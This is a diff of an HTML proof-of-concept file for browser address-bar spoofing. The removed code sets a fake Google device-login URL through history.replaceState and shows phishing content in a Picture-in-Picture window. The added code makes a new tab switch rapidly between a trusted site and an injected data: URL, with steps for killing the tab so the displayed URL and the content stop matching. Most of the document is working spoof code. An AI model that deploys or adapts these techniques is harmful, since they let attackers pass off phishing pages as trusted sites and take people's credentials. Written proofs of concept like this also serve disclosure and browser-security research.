@@ -1,30 +1,62 @@
-<style>
-    #content {
-        display: none;
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>Navigation Desync PoC</title>
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      text-align: center;
+      margin-top: 100px;
     }
-</style>
+    button {
+      padding: 12px 20px;
+      font-size: 16px;
+      cursor: pointer;
+    }
+  </style>
+</head>
+<body>
 
-<button id="button">Open PIP</button>
-
-<div id="content">
-    phishing page content here
-</div>
+<h2>Navigation Desync / URL Spoof PoC</h2>
+<button onclick="start()">Start PoC</button>
 
 <script>
-    const pipOpen = async () => {
-        history.replaceState(null, '', '?...............................https://accounts.google.com/login/device/verify');
+function start() {
+  let w = window.open(location.href, "_blank");
 
-        const pipWindow = await documentPictureInPicture.requestWindow({
-            width: 330,
-            height: 317
-        });
-        
-        setTimeout(() => {
-            history.replaceState(null, '', '/');
-        }, 1000);
+  // Step 1: Navigate to trusted site
+  setTimeout(() => {
+    try {
+      w.location = "https://http.cat/200";
+    } catch(e) {}
+  }, 100);
 
-        pipWindow.document.body.append(content);
-    };
+  // Step 2: Rapid navigation switching
+  let urls = [
+    "https://http.cat/200",
+    "data:text/html,<h1 style='text-align:center;margin-top:40vh;'>Injected Content</h1>"
+  ];
 
-    button.onclick = pipOpen;
+  let i = 0;
+  let interval = setInterval(() => {
+    try {
+      w.location = urls[i % 2];
+      i++;
+    } catch(e) {}
+  }, 50);
+
+  // Stop after some time
+  setTimeout(() => {
+    clearInterval(interval);
+  }, 5000);
+}
 </script>
+
+<p>💡 After clicking "Start PoC":</p>
+<p>1. Quickly open Browser Task Manager (Shift + Esc)</p>
+<p>2. Kill the new tab process while it's switching</p>
+<p>3. Observe if content mismatches the URL</p>
+
+</body>
+</html>
